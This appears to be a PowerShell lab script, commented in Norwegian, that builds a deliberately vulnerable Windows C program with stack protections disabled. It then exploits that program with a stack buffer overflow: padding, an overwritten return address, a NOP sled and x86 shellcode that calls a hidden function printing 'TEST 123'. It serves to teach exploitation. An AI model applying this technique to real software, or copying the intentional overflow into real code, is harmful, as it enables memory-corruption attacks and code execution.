# 1. Opprett C-kildekoden
$cCode = @'
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Død funksjon som aldri kalles i programmets normale flyt
void dod_funksjon(void) {
    printf("TEST 123\n");
    fflush(stdout);
    exit(0);
}

void unprotect_stack(void *addr) {
    DWORD oldProtect;
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(addr, &mbi, sizeof(mbi));
    VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
}

void vuln(void) {
    char buffer[64];
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    DWORD bytesRead = 0;

    unprotect_stack(buffer);

    // Lekker bufferadressen slik at payloaden vet hvor den skal sikte
    printf("[ADDR] %p\n", (void*)buffer);
    fflush(stdout);

    // Leser inntil 256 bytes inn i 64-byte buffer
    ReadFile(hStdin, buffer, 256, &bytesRead, NULL);
}

int main(void) {
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
    vuln();
    printf("Avsluttet normalt.\n");
    return 0;
}
'@
Set-Content -Path "vuln_win.c" -Value $cCode

# 2. Legg til MinGW 32-bit i PATH hvis tilgjengelig, og kompiler
if (Test-Path "C:\mingw32\bin") {
    $env:PATH = "C:\mingw32\bin;$env:PATH"
}

Write-Host "[*] Kompilerer vuln_win.c..." -ForegroundColor Cyan
gcc -m32 -fno-stack-protector -fno-pie "-Wl,--disable-nxcompat" vuln_win.c -o vuln_win.exe

if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] Kompilering feilet. Kontroller at gcc (MinGW 32-bit) er i PATH." -ForegroundColor Red
    return
}

# Finn RVA (Relativ Virtuell Adresse) for dod_funksjon i den kompilerte binæren
$nmOutput = (& nm vuln_win.exe | Select-String '_dod_funksjon')
if ($nmOutput -match '([0-9a-fA-F]{8})\s+T\s+_dod_funksjon') {
    $funcAddr = [Convert]::ToUInt32($matches[1], 16)
    $funcRva = $funcAddr - 0x00400000
    Write-Host ("[+] Funnet dod_funksjon: 0x{0:X8} (RVA: 0x{1:X8})" -f $funcAddr, $funcRva) -ForegroundColor Green
}
else {
    Write-Host "[!] Fant ikke symbolet _dod_funksjon i vuln_win.exe." -ForegroundColor Red
    return
}

# 3. Start prosessen med piped standard input/output
# Unngå at .NET StreamWriter sender UTF-8 BOM (EF BB BF) som første ReadFile-lesing
[Console]::InputEncoding = New-Object System.Text.UTF8Encoding($false)

Write-Host "[*] Starter prosessen for å hente lekket bufferadresse..." -ForegroundColor Cyan
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "$PWD\vuln_win.exe"
$psi.UseShellExecute = $false
$psi.RedirectStandardInput = $true
$psi.RedirectStandardOutput = $true
$psi.CreateNoWindow = $true

$proc = [System.Diagnostics.Process]::Start($psi)

# 4. Les adressen fra programmets stdout
$line = $proc.StandardOutput.ReadLine()
Write-Host "[+] Mottatt output: $line" -ForegroundColor Green

if ($line -match '\[ADDR\]\s+([0-9a-fA-F]+)') {
    $bufferAddr = [Convert]::ToUInt32($matches[1], 16)
    Write-Host ("[+] Buffer start: 0x{0:X8}" -f $bufferAddr) -ForegroundColor Green
}
else {
    Write-Host "[!] Kunne ikke hente stakkadresse." -ForegroundColor Red
    $proc.Kill()
    return
}

# 5. Bygg payload:
# [Buffer-utfylling til returadresse (80 bytes)]
# + [Overskrevet returadresse til NOP-sled på stakk (4 bytes)]
# + [NOP-sled (32 bytes)]
# + [Shellcode (16 bytes) som henter ImageBase fra PEB, beregner adresse til dod_funksjon og kaller den]

# 80 bytes padding som fyller buffer (76 bytes) og lagret EBP (4 bytes)
$padToRet = [byte[]](@(0x90) * 80)

# 32 bytes NOP-sled (0x90) plassert rett etter returadressen
$nopSled = [byte[]](@(0x90) * 32)

# Konverter funksjonens RVA til 4 bytes (little-endian)
$rvaBytes = [System.BitConverter]::GetBytes([uint32]$funcRva)

# Shellcode: 32-bit x86 posisjonsuavhengig kode
# - Henter ImageBase fra PEB (fs:[0x30] + 0x08)
# - Legger til RVA for dod_funksjon (EAX = runtime adresse til dod_funksjon)
# - Kaller dod_funksjon() -> skriver ut "TEST 123" og avslutter ryddig via exit(0)
[byte[]]$shellcode = @(
    # 1. Hent ImageBase fra PEB (fs:[0x30] + 0x08)
    0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,             # mov eax, [fs:0x30] (PEB)
    0x8B, 0x40, 0x08,                               # mov eax, [eax + 0x08] (PEB->ImageBaseAddress)

    # 2. Legg til RVA for dod_funksjon
    0x05, $rvaBytes[0], $rvaBytes[1], $rvaBytes[2], $rvaBytes[3], # add eax, funcRva

    # 3. Kall dod_funksjon()
    0xFF, 0xD0                                      # call eax
)

# Returadressen settes til å lande midt i NOP-sledden (offset 84 + 16 bytes)
$targetAddr = $bufferAddr + 84 + 16
$retBytes = [System.BitConverter]::GetBytes([uint32]$targetAddr)
Write-Host ("[+] Returadresse satt til NOP-sled: 0x{0:X8}" -f $targetAddr) -ForegroundColor Yellow

# Slå sammen hele payloaden til en rå byte-array
$payload = [byte[]]($padToRet + $retBytes + $nopSled + $shellcode)

# 6. Send payloaden til prosessens stdin
Write-Host "[*] Sender payload ($($payload.Length) bytes)..." -ForegroundColor Cyan
$proc.StandardInput.BaseStream.Write($payload, 0, $payload.Length)
$proc.StandardInput.BaseStream.Flush()
$proc.StandardInput.Close()

# 7. Les og vis programmets resterende output
$output = $proc.StandardOutput.ReadToEnd()
if ($output) {
    Write-Host $output -ForegroundColor Yellow
}

$proc.WaitForExit()
Write-Host ("[+] Prosess avsluttet med kode: 0x{0:X8}" -f $proc.ExitCode) -ForegroundColor Cyan
